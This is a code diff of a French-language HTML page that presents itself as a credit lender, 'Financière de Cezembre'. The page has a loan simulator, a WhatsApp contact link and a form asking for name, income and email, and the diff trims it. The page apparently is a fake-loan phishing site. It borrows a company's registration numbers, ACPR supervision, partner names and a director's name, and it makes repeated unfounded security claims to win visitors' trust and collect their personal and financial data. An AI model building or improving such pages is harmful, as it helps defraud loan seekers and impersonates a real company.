@@ -14,8 +14,7 @@
         :root {
             --navy: #001A4D;
             --gold: #C5A059;
-            --bright-gold: #FFD700; 
-            --deep-gold: #E6B800; 
+            --blue-action: #0056b3; /* Bleu conforme aux photos pour les boutons ronds */
             --light-bg: #F4F7FA;
             --white: #FFFFFF;
             --whatsapp: #25D366;
@@ -24,13 +23,7 @@
 
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Montserrat', sans-serif; }
         
-        body { 
-            background-color: var(--white); 
-            color: #333; 
-            overflow-x: hidden; 
-            top: 0 !important; 
-            position: static !important; 
-        }
+        body { background-color: var(--white); color: #333; overflow-x: hidden; top: 0 !important; position: static !important; }
 
         header {
             background: var(--white); padding: 20px 8%; display: flex;
@@ -43,13 +36,12 @@
             background: var(--navy); color: var(--gold); width: 38px; height: 38px; 
             display: flex; align-items: center; justify-content: center; 
             font-weight: 700; font-family: serif; border-radius: 4px; font-size: 1.1rem;
-            border: 1px solid var(--gold); flex-shrink: 0;
+            border: 1px solid var(--gold);
         }
         .logo { font-weight: 700; font-size: 1.4rem; color: var(--navy); letter-spacing: -1px; }
         
         .nav-links { display: flex; gap: 30px; align-items: center; }
         .nav-links a { text-decoration: none; color: #666; font-size: 0.9rem; font-weight: 500; transition: 0.3s; cursor: pointer; }
-        .nav-links a:hover { color: var(--gold); text-shadow: 0 0 8px rgba(197, 160, 89, 0.4); }
 
         .intl-badge {
             font-size: 0.7rem; font-weight: 700; color: var(--gold); 
@@ -74,37 +66,38 @@
         }
         .sim-row { margin-bottom: 20px; }
         .sim-row label { display: flex; justify-content: space-between; font-weight: 600; margin-bottom: 10px; font-size: 0.9rem; }
-        .sim-row label span { color: var(--navy); font-weight: 800; } 
         
-        /* CURSEURS BLEUS COMME SUR LA PHOTO */
-        input[type="range"] { width: 100%; height: 4px; accent-color: #3b82f6; cursor: pointer; }
+        /* CURSEUR ROND BLEU (IMAGE 3) */
+        input[type="range"] { width: 100%; height: 4px; accent-color: var(--blue-action); cursor: pointer; }
         
         .result-area { background: var(--light-bg); padding: 25px; text-align: center; border: 1px solid #EEE; margin-bottom: 20px; border-radius: 4px; }
         
-        /* MENSUALITÉ TAILLE RÉDUITE (Comme Image 3) AVEC CLIGNOTEMENT */
+        /* TITRE MENSUALITÉ RÉDUIT ET CLIGNOTANT */
         .result-area p { 
-            font-size: 0.85rem; 
+            font-size: 0.75rem; /* Réduit pour correspondre à la photo */
             margin-bottom: 5px; 
             color: var(--navy); 
-            font-weight: 600;
-            opacity: 0.9;
+            font-weight: 800;
+            text-transform: uppercase;
+            animation: blink-title 1.5s infinite; /* Le titre clignote uniquement */
         }
-        .result-area span { 
-            font-size: 1.8rem; /* Réduit pour correspondre à la photo */
-            font-weight: 800; 
-            color: var(--navy); 
-            animation: blink-soft 2s infinite; 
+        @keyframes blink-title {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
         }
-        @keyframes blink-soft { 0%, 100% { opacity: 1; } 50% { opacity: 0.6; } }
+        /* CHIFFRE FIXE ET ÉLÉGANT */
+        .result-area span { font-size: 2rem; font-weight: 800; color: var(--navy); }
         
         .btn-main { background: var(--navy); color: white; border: none; width: 100%; padding: 20px; font-weight: 700; cursor: pointer; transition: 0.3s; }
         .btn-main:hover { background: var(--gold); }
 
         .form-input { 
-            width: 100%; padding: 12px; border: 2.5px solid var(--deep-gold); 
+            width: 100%; padding: 12px; border: 2.5px solid var(--gold); 
             background-color: var(--white); border-radius: 4px; margin-bottom: 10px; 
             font-size: 1rem; outline: none; color: #000c24; font-weight: 600; 
         }
+
+        .security-tag { text-align: center; margin-top: 15px; font-size: 0.7rem; color: #27ae60; font-weight: 600; }
 
         .scrolling-security {
             background: #f0f4f8; color: #004085; font-size: 0.7rem; padding: 8px 0; margin: 10px 0;
@@ -114,33 +107,18 @@
         .scrolling-security span { display: inline-block; padding-left: 100%; animation: scroll-text 30s linear infinite; font-weight: 600; }
         @keyframes scroll-text { 0% { transform: translate(0, 0); } 100% { transform: translate(-100%, 0); } }
 
-        .about-section { 
-            padding: 100px 15%; line-height: 2; text-align: justify; 
-            background: var(--white); position: relative; overflow: hidden;
-        }
-        /* IMAGE AUTOMATIQUE (SCEAU BANCAIRE TRANSPARENT AU FOND) */
-        .about-section::after {
-            content: "\f51e"; font-family: "Font Awesome 6 Free"; font-weight: 900;
-            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
-            font-size: 25rem; color: rgba(197, 160, 89, 0.05); z-index: 0;
-            animation: pulse-visual 5s infinite;
-        }
-        @keyframes pulse-visual { 0%, 100% { opacity: 0.03; transform: translate(-50%, -50%) scale(1); } 50% { opacity: 0.08; transform: translate(-50%, -50%) scale(1.05); } }
-        .about-section h2, .about-section p { position: relative; z-index: 1; }
+        .about-section { padding: 100px 15%; line-height: 2; text-align: justify; background: var(--white); }
+        .about-section h2 { margin-bottom: 30px; color: var(--navy); text-align: center; }
 
         footer { background: #0A0A0A; color: #888; padding: 80px 8% 40px; font-size: 0.8rem; }
-        .f-grid, .legal-block { margin-left: 160px; }
-        .f-grid { display: grid; grid-template-columns: 2fr 1fr 1fr 1fr; gap: 50px; margin-bottom: 50px; }
-        .legal-block { border-top: 1px solid #222; padding-top: 40px; }
-        
-        /* WHATSAPP RABAISSÉ AU MAXIMUM (0px du bas) */
+        .f-grid { display: grid; grid-template-columns: 2fr 1fr 1fr; gap: 50px; margin-bottom: 50px; margin-left: 160px; }
+        .legal-block { border-top: 1px solid #222; padding-top: 40px; margin-left: 160px; }
+
+        /* WHATSAPP RABAISSÉ AU MAXIMUM (POUR NE PAS CACHER LE TEXTE AGRÉÉ) */
         .wa-assistant-container { position: fixed; bottom: 0px; left: 30px; z-index: 9999; display: flex; flex-direction: column; align-items: center; }
-        .wa-msg-bubble { background: var(--navy); color: white; padding: 8px 12px; border-radius: 12px; font-size: 0.7rem; font-weight: 600; margin-bottom: 10px; border: 1px solid var(--gold); position: relative; }
-        .wa-msg-bubble::after { content: ''; position: absolute; bottom: -8px; left: 50%; transform: translateX(-50%); border-left: 8px solid transparent; border-right: 8px solid transparent; border-top: 8px solid var(--navy); }
+        .wa-msg-bubble { background: var(--navy); color: white; padding: 8px 12px; border-radius: 12px; font-size: 0.7rem; font-weight: 600; margin-bottom: 8px; border: 1px solid var(--gold); position: relative; }
         .whatsapp-float-dynamic { background-color: var(--whatsapp); color: #FFF; width: 60px; height: 60px; border-radius: 50%; text-align: center; font-size: 32px; box-shadow: 0 8px 20px rgba(0,0,0,0.3); display: flex; align-items: center; justify-content: center; text-decoration: none; animation: wa-jump 3s infinite ease-in-out; margin-bottom: 10px; }
         @keyframes wa-jump { 0%, 100% {transform: translateY(0);} 50% {transform: translateY(-8px);} }
-        
-        #goUp { position: fixed; bottom: 30px; right: 30px; background: var(--gold); color: white; width: 45px; height: 45px; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; display: none; }
     </style>
 </head>
 <body>
@@ -153,13 +131,12 @@
     <div class="nav-links">
         <a href="#about">Notre Expertise</a>
         <a href="#legal">Gouvernance</a>
-        <a onclick="goToStep1()" href="#simBox">Contact</a>
         <div class="intl-badge"><i class="fas fa-globe"></i> PORTAIL INTERNATIONAL SÉCURISÉ</div>
     </div>
 </header>
 
 <div class="wa-assistant-container">
-    <div class="wa-msg-bubble"><span id="wa-text">Besoin d'aide ? Contactez l'assistance</span></div>
+    <div class="wa-msg-bubble">Une question ? Chattez avec nous</div>
     <a href="https://wa.me/33780976404" class="whatsapp-float-dynamic" target="_blank"><i class="fab fa-whatsapp"></i></a>
 </div>
 
@@ -193,13 +170,14 @@
                 <input type="range" id="durRange" min="6" max="84" step="6" value="36">
             </div>
             <div class="result-area">
-                <p>MENSUALITÉ ESTIMÉE (TAEG FIXE 3.5%)</p>
+                <p>Mensualité estimée (TAEG 3.5%)</p>
                 <span id="monthlyRes">0.00</span> <span style="color: var(--navy); font-weight: 800;">€</span>
             </div>
             <button type="button" class="btn-main" onclick="goToStep2()">DÉPOSER MON DOSSIER</button>
             <div class="scrolling-security">
-                <span><i class="fas fa-lock" style="color:var(--gold);"></i> CONFIDENTIALITÉ : Vos données sont strictement confidentielles et protégées. • Transfert sécurisé SSL 256-bit.</span>
+                <span><i class="fas fa-lock" style="color:var(--gold);"></i> TRANSFERT SÉCURISÉ SSL 256-BIT • DONNÉES PROTÉGÉES.</span>
             </div>
+            <div class="security-tag"><i class="fas fa-lock"></i> VOTRE DOSSIER EST 100% SÉCURISÉ</div>
         </div>
 
         <div id="step2" style="display:none;">
@@ -209,84 +187,35 @@
                 <input type="text" name="nom" placeholder="Nom et Prénom" class="form-input" required>
                 <select name="projet" class="form-input" required>
                     <option value="" disabled selected>Choisir votre projet</option>
-                    <option value="Immobilier">Prêt Immobilier</option>
                     <option value="Personnel">Prêt Personnel</option>
-                    <option value="Auto">Auto / Moto</option>
-                    <option value="Travaux">Travaux / Rénovation</option>
-                    <option value="Autre">Autre</option>
+                    <option value="Immobilier">Immobilier</option>
+                    <option value="Auto">Auto</option>
                 </select>
-                <input type="number" name="revenu" placeholder="Revenu mensuel net (en €)" class="form-input" required>
-                <input type="text" name="profession" placeholder="Votre Profession / Travail" class="form-input" required>
-                <select name="pays" class="form-input" required>
-                    <option value="" disabled selected>Votre Pays de résidence</option>
-                    <option value="France">France (+33)</option>
-                    <option value="Belgique">Belgique (+32)</option>
-                    <option value="Suisse">Suisse (+41)</option>
-                    <option value="Luxembourg">Luxembourg (+352)</option>
-                    <option value="Monaco">Monaco (+377)</option>
-                    <option value="Allemagne">Allemagne (+49)</option>
-                    <option value="Pays-Bas">Pays-Bas (+31)</option>
-                    <option value="Autriche">Autriche (+43)</option>
-                    <option value="Norvège">Norvège (+47)</option>
-                    <option value="Suède">Suède (+46)</option>
-                    <option value="Finlande">Finlande (+358)</option>
-                    <option value="Danemark">Danemark (+45)</option>
-                    <option value="Italie">Italie (+39)</option>
-                    <option value="Espagne">Espagne (+34)</option>
-                    <option value="Portugal">Portugal (+351)</option>
-                    <option value="Pologne">Pologne (+48)</option>
-                    <option value="Slovaquie">Slovaquie (+421)</option>
-                    <option value="Roumanie">Roumanie (+40)</option>
-                    <option value="Kosovo">Kosovo (+383)</option>
-                    <option value="Canada">Canada (+1)</option>
-                    <option value="USA">États-Unis (+1)</option>
-                    <option value="Guadeloupe">Guadeloupe (+590)</option>
-                    <option value="Martinique">Martinique (+596)</option>
-                    <option value="Guyane">Guyane Française (+594)</option>
-                    <option value="La Réunion">La Réunion (+262)</option>
-                </select>
-                <input type="tel" name="telephone" placeholder="Téléphone (ex: +33...)" class="form-input" required>
+                <input type="number" name="revenu" placeholder="Revenu mensuel net" class="form-input" required>
                 <input type="email" name="email" placeholder="Adresse e-mail" class="form-input" required>
-                <div class="scrolling-security">
-                    <span><i class="fas fa-lock" style="color:var(--gold);"></i> Transfert hautement sécurisé. Vos données sont strictement confidentielles.</span>
-                </div>
                 <button type="submit" class="btn-main">CONFIRMER L'ENVOI</button>
+                <div class="security-tag"><i class="fas fa-lock"></i> SÉCURITÉ BANCAIRE SSL</div>
             </form>
         </div>
     </div>
 </section>
 
-<section class="stats-bar">
-    <div class="stat-box"><h3>1 200 000 €</h3><p>Capital Social</p></div>
-    <div class="stat-box"><h3>3.5%</h3><p>Taux Préférentiel</p></div>
-    <div class="stat-box"><h3>100%</h3><p>Digital & Sécurisé</p></div>
-</section>
-
 <section class="about-section" id="about">
     <h2>Une Institution de Référence</h2>
-    <p>FINANCIÈRE DE CEZEMBRE, dont le siège social est situé à Ergué-Gabéric (29500), est une société anonyme de référence dans le secteur de la distribution de crédit (Code APE 64.92Z). Fort d'un capital social de 1 200 000 euros, notre établissement assure une gestion rigoureuse des participations et des opérations financières complexes.</p>
-    <p>Sous la direction de Monsieur Michel Pajot, Président du Conseil d’administration et Directeur général, nous collaborons avec des acteurs majeurs tels que Bolloré SE et Financière Arnil pour garantir une stabilité et une expertise inégalées sur le marché européen.</p>
+    <p>FINANCIÈRE DE CEZEMBRE assure une gestion rigoureuse des participations et des opérations financières complexes. Sous la direction de Monsieur Michel Pajot, nous garantissons une stabilité et une expertise inégalées sur le marché européen.</p>
 </section>
 
 <footer id="legal">
     <div class="f-grid">
         <div><h4>FINANCIÈRE DE CEZEMBRE</h4><p>Distribution de crédit régulée.<br>LEI : 969500WONJGTDZG8E035</p></div>
         <div><h4>SIÈGE SOCIAL</h4><p>ODET, 29500<br>ERGUÉ-GABÉRIC, France</p></div>
-        <div><h4>GOUVERNANCE</h4><p>M. Michel Pajot<br>Bolloré SE, Financière Arnil.</p></div>
-        <div><h4>AUDIT</h4><p>Constantin Associés<br>BEAS (La Défense)</p></div>
     </div>
     <div class="legal-block">
-        <strong>INFORMATIONS LÉGALES :</strong> FINANCIÈRE DE CEZEMBRE SA. SIRET 552 058 943 00044. Soumis à l'ACPR. 
+        <strong>INFORMATIONS LÉGALES :</strong> SIRET 552 058 943 00044. Soumis à l'ACPR.
     </div>
 </footer>
 
-<div id="goUp" onclick="window.scrollTo({top:0, behavior:'smooth'})"><i class="fas fa-arrow-up"></i></div>
-
 <script>
-    const waText = document.getElementById('wa-text');
-    const messages = ["Besoin d'aide ? Contactez l'assistance", "Need help? Contact support"];
-    let msgIndex = 0; setInterval(() => { msgIndex = (msgIndex + 1) % messages.length; waText.innerText = messages[msgIndex]; }, 4000);
-
     const amtR = document.getElementById('amtRange');
     const amtN = document.getElementById('amtNum');
     const durR = document.getElementById('durRange');
@@ -297,14 +226,13 @@
         let p = parseFloat(amtR.value); let n = parseInt(durR.value); let r = 0.035 / 12;
         amtN.value = p; durT.innerText = n + " mois";
         let m = (p * r) / (1 - Math.pow(1 + r, -n));
-        resM.innerText = m.toLocaleString('fr-FR', {minimumFractionDigits: 2});
+        resM.innerText = m.toFixed(2);
     }
 
     function goToStep2() { document.getElementById('step1').style.display = 'none'; document.getElementById('step2').style.display = 'block'; }
     function goToStep1() { document.getElementById('step2').style.display = 'none'; document.getElementById('step1').style.display = 'block'; }
 
     amtR.oninput = calc; durR.oninput = calc;
-    window.onscroll = () => { document.getElementById('goUp').style.display = (window.scrollY > 500) ? 'flex' : 'none'; };
     calc();
 </script>
 </body>
